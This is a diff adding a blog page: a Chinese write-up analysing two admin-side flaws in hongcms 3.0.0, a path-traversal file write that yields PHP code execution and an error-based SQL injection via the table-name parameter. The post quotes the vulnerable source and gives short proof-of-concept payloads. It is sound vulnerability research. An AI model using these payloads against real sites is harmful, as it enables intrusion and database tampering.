@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误');
+                history.back();
+            }
+        }
+    })();
+</script>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="前言：hongcms似乎到4.0.0版本就停止维护了，可通过挂WAF来处理安全问题，小型的开发框架。 ubuntu 19php5.6+mysqlphpstorm+burpsuit 写在前面：还是和之前一样，根据POC，寻找漏洞触发的点，磕磕碰碰的，挺艰难的，题外话，今天下午一直在尝试在windows上远程调试linux上的cms代码，失败了，贼难受，一整个下午都不好过，早早地就停止学习了……，然后">
+<meta name="keywords" content="root">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hongcms3.0.0后台代码执行+sql注入">
+<meta property="og:url" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/index.html">
+<meta property="og:site_name" content="The clown is laughing at you">
+<meta property="og:description" content="前言：hongcms似乎到4.0.0版本就停止维护了，可通过挂WAF来处理安全问题，小型的开发框架。 ubuntu 19php5.6+mysqlphpstorm+burpsuit 写在前面：还是和之前一样，根据POC，寻找漏洞触发的点，磕磕碰碰的，挺艰难的，题外话，今天下午一直在尝试在windows上远程调试linux上的cms代码，失败了，贼难受，一整个下午都不好过，早早地就停止学习了……，然后">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/9.png">
+<meta property="og:updated_time" content="2019-07-25T15:49:03.756Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hongcms3.0.0后台代码执行+sql注入">
+<meta name="twitter:description" content="前言：hongcms似乎到4.0.0版本就停止维护了，可通过挂WAF来处理安全问题，小型的开发框架。 ubuntu 19php5.6+mysqlphpstorm+burpsuit 写在前面：还是和之前一样，根据POC，寻找漏洞触发的点，磕磕碰碰的，挺艰难的，题外话，今天下午一直在尝试在windows上远程调试linux上的cms代码，失败了，贼难受，一整个下午都不好过，早早地就停止学习了……，然后">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/1.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>hongcms3.0.0后台代码执行+sql注入 | The clown is laughing at you</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">The clown is laughing at you</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/hongcms3-0-0后台代码执行-sql注入/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cookie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/name.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The clown is laughing at you">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hongcms3.0.0后台代码执行+sql注入
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-25 20:28:41 / Modified: 23:49:03" itemprop="dateCreated datePublished" datetime="2019-07-25T20:28:41+08:00">2019-07-25</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>hongcms似乎到4.0.0版本就停止维护了，可通过挂WAF来处理安全问题，小型的开发框架。</p>
+<p>ubuntu 19<br>php5.6+mysql<br>phpstorm+burpsuit</p>
+<h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>还是和之前一样，根据POC，寻找漏洞触发的点，磕磕碰碰的，挺艰难的，题外话，今天下午一直在尝试在windows上远程调试linux上的cms代码，失败了，贼难受，一整个下午都不好过，早早地就停止学习了……，然后debug很重要，还会继续尝试，一定要熟练使用。</p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>这次的漏洞，主要都是由于过滤的问题，导致漏洞的出现，一个是代码执行漏洞，一个是sql注入漏洞。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>和之前一样，一套新的cms,一定要先分析其路由，看看是如何调用模块，以及每个函数是如何调用。<br>定位index.php<br><img src="/2019/07/25/hongcms3-0-0后台代码执行-sql注入/1.png" alt=""><br>看到<code>APP::run()</code><br>跟进APP::run()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 框架主方法 !!!</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$splitFlag = preg_quote(<span class="keyword">self</span>::$splitFlag,<span class="string">"/"</span>);</span><br><span class="line">		$path_array = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">		$path = <span class="keyword">isset</span>($_SERVER[<span class="string">'PATH_INFO'</span>]) ? $_SERVER[<span class="string">'PATH_INFO'</span>] : @getenv(<span class="string">'PATH_INFO'</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>($path))&#123;</span><br><span class="line">			<span class="keyword">if</span>($path[<span class="number">0</span>]==<span class="string">"/"</span>) $path=strtolower(substr($path,<span class="number">1</span>));</span><br><span class="line">			$path_array = preg_split(<span class="string">"/[$splitFlag\/]/"</span>,$path,<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$controller	= !<span class="keyword">empty</span>($path_array[<span class="number">0</span>]) ? $path_array[<span class="number">0</span>] : <span class="keyword">self</span>::$defaultController ;</span><br><span class="line">		$action	= !<span class="keyword">empty</span>($path_array[<span class="number">1</span>]) ? $path_array[<span class="number">1</span>] : <span class="keyword">self</span>::$defaultAction ;</span><br><span class="line"></span><br><span class="line">		$app_file = <span class="keyword">self</span>::$appDir . <span class="string">"controllers/"</span> . $controller . <span class="string">".php"</span>;</span><br><span class="line">		<span class="keyword">if</span>(!is_file($app_file))&#123;</span><br><span class="line">			<span class="keyword">self</span>::debug(<span class="string">"file[$app_file] does not exists."</span>, $controller);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">require_once</span>(realpath($app_file));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$classname = <span class="string">'c_'</span> . $controller;</span><br><span class="line">		<span class="keyword">if</span>(!class_exists($classname, <span class="keyword">false</span>))&#123;</span><br><span class="line">			<span class="keyword">self</span>::debug(<span class="string">"class[$classname] does not exists."</span>, $controller);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$path_array[<span class="number">0</span>] = $controller;</span><br><span class="line">		$path_array[<span class="number">1</span>] = $action;</span><br><span class="line">		$classInstance = <span class="keyword">new</span> $classname($path_array);</span><br><span class="line">		<span class="keyword">if</span>(!method_exists($classInstance,$action))&#123;</span><br><span class="line">			<span class="keyword">self</span>::debug(<span class="string">"method[$action] does not exists in class[$classname]."</span>, $controller);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> call_user_func(<span class="keyword">array</span>(&amp;$classInstance,$action),$path_array);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>因为我们去点击主页上的每一个功能，比如新闻版块，url就变成这样，然后用debug调试一下，<br><img src="/2019/07/25/hongcms3-0-0后台代码执行-sql注入/3.png" alt=""><br><img src="/2019/07/25/hongcms3-0-0后台代码执行-sql注入/4.png" alt=""><br>会发现这个CMS调用每个模块的方法是<strong>hongcms/index.php/controllers/actions</strong><br><img src="/2019/07/25/hongcms3-0-0后台代码执行-sql注入/2.png" alt=""></p>
+<p>登录后台，点击每个模块看一下，然后点击新闻添加模块<br><img src="/2019/07/25/hongcms3-0-0后台代码执行-sql注入/5.png" alt=""><br>查看路由，会发现后台调用某模块下的某函数也是用同样的方法<br><img src="/2019/07/25/hongcms3-0-0后台代码执行-sql注入/6.png" alt=""></p>
+<h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><p>定位：./admin/controllers/template.php::save()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$file = ForceStringFrom(<span class="string">'file'</span>);</span><br><span class="line">	$filepath = <span class="keyword">$this</span>-&gt;temp_path . <span class="keyword">$this</span>-&gt;current_dir . $file;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (is_writable($filepath)) &#123;</span><br><span class="line">		$filecontent = trim($_POST[<span class="string">'filecontent'</span>]);</span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc()) &#123;</span><br><span class="line">			$filecontent = stripslashes($filecontent);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$fd = fopen($filepath, <span class="string">'wb'</span>);</span><br><span class="line">		fputs($fd,$filecontent);</span><br><span class="line"></span><br><span class="line">		Success(<span class="string">'template'</span>. Iif(<span class="keyword">$this</span>-&gt;current_dir, <span class="string">'?dir='</span> . <span class="keyword">$this</span>-&gt;current_dir));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$errors = <span class="string">'模板文件('</span>.$file.<span class="string">')不可写! 请将其属性设置为: 777'</span>;</span><br><span class="line">		Error($errors, <span class="string">'编辑模板错误'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以在在网站中寻找一下，这个功能何时被使用。<br><img src="/2019/07/25/hongcms3-0-0后台代码执行-sql注入/7.png" alt=""><br>$filepath会先进入<strong>if (is_writable($filepath))</strong>进行是否可操作判断，那么也就是说，我们所选择的这个文件来自于系统内部。所以这里我们可以考虑使用目录穿越选择一个文件写入我们想写的代码等，抓包也可看到<strong>$filecontent</strong>来自于用户输入，可控。<br>跟进<code>$file = ForceStringFrom(&#39;file&#39;);</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ForceStringFrom</span><span class="params">($VariableName, $DefaultValue = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[$VariableName])) &#123;</span><br><span class="line">		<span class="keyword">return</span> ForceString($_GET[$VariableName], $DefaultValue);</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[$VariableName])) &#123;</span><br><span class="line">		<span class="keyword">return</span> ForceString($_POST[$VariableName], $DefaultValue);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $DefaultValue;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[$VariableName])) &#123;</span><br><span class="line">		<span class="keyword">return</span> ForceString($_POST[$VariableName], $DefaultValue);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可见$file是可控的，接着跟进ForceString()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ForceString</span><span class="params">($InValue, $DefaultValue = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_string($InValue)) &#123;</span><br><span class="line">		$sReturn = EscapeSql(trim($InValue));</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($sReturn) &amp;&amp; strlen($sReturn) == <span class="number">0</span>) $sReturn = $DefaultValue;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$sReturn = EscapeSql($DefaultValue);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $sReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>会发现，我们们传入的数据会经过EscapeSql()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EscapeSql</span><span class="params">($query_string)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc()) &#123;</span><br><span class="line">		$query_string = stripslashes($query_string);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$query_string = htmlspecialchars(str_replace (<span class="keyword">array</span>(<span class="string">'\0'</span>, <span class="string">'　'</span>), <span class="string">''</span>, $query_string), ENT_QUOTES);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">		$query_string = mysql_real_escape_string($query_string);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(function_exists(<span class="string">'mysql_escape_string'</span>))&#123;</span><br><span class="line">		$query_string = mysql_escape_string($query_string);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$query_string = addslashes($query_string);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $query_string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里对文件内容进行html实体转义，以及过滤，反sql注入的处理。但是这个并不影响我们使用目录穿越，寻找可操作性文件。<br>构造如下文件名：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../phpinfo.php</span><br></pre></td></tr></table></figure></p>
+<p>$filepath在这里就是<code>$filepath=/hongcms300/public/templates/Default/$file</code><br>我们控制了$file相当于控制$filepath：）</p>
+<p>寻找一下，发现./models/user.php可以用于写入，用作测试，实际上除了，这个文件，其余的文件也是可以的。<br>构造payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file=../../../models/user.php</span><br><span class="line">$filecontent = <span class="meta">&lt;?php</span>  phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/25/hongcms3-0-0后台代码执行-sql注入/8.png" alt=""><br><img src="/2019/07/25/hongcms3-0-0后台代码执行-sql注入/9.png" alt=""></p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>定位：./admin/controllers/database.php::EmptyTable()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">EmptyTable</span><span class="params">($tablename)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db-&gt;exe(<span class="string">"DELETE FROM `$tablename`"</span>);</span><br><span class="line">		$msg = <span class="string">'已完成清空数据库表: '</span> . $tablename . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $msg;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>跟进exe()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exe</span><span class="params">($query)</span>	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;query_nums++;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;query_id = @mysql_query($query, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;query_id)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;error(<span class="string">"Invalid SQL: "</span>.$query); <span class="comment">//查询失败输出错误</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (preg_match(<span class="string">"/^(insert|replace)\s+/i"</span>, $query))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;insert_id = @mysql_insert_id(<span class="keyword">$this</span>-&gt;conn); <span class="comment">//记录新插入的ID</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;result_nums = @mysql_affected_rows(<span class="keyword">$this</span>-&gt;conn); <span class="comment">//记录影响的行数</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;result_nums; <span class="comment">//返回影响的行数</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以发现$tablename这里可能会有问题，然后回头去找，$tablename是否是我们可控数据，<br>定位./admin/controllers/database.php::operate()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operate</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$action = ForceStringFrom(<span class="string">'dbaction'</span>);</span><br><span class="line">		$tablename = ForceStringFrom(<span class="string">'tablename'</span>);</span><br><span class="line">		<span class="keyword">switch</span> ($action)&#123;</span><br><span class="line">			.... ....</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'emptytable'</span>:</span><br><span class="line">				<span class="keyword">$this</span>-&gt;PrintResults(<span class="string">'数据库表清空'</span>, <span class="keyword">$this</span>-&gt;EmptyTable($tablename));</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		.... ....</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>根据之前的分析，我们可以知道$tablename，我们可控，而且这里的过滤做的不严谨<br>payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">60</span>+where+vvcid%<span class="number">3</span>d1+<span class="keyword">or</span>+updatexml(<span class="number">1</span>%<span class="number">2</span>cconcat(<span class="number">0x7e</span>%<span class="number">2</span>cuser()%<span class="number">2</span>c0x7e)%<span class="number">2</span>c1)+<span class="keyword">or</span>+%<span class="number">60</span></span><br></pre></td></tr></table></figure></p>
+<p>这里有一个被我忽略掉的地方，就是反引号<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;exe(<span class="string">"DELETE FROM `$tablename`"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>因为在数据库操作的时候，有些表名如果和关键字一样，比如select，from这样的词，所以操作表数据时，比如delete from <code>delete</code>，用反引号。 </p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/24/sql注入奇巧淫技-二/" rel="next" title="sql注入奇巧淫技(二)">
+                <i class="fa fa-chevron-left"></i> sql注入奇巧淫技(二)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="/images/name.png" alt="cookie">
+  
+  <p class="site-author-name" itemprop="name">cookie</p>
+  <div class="site-description motion-element" itemprop="description"></div>
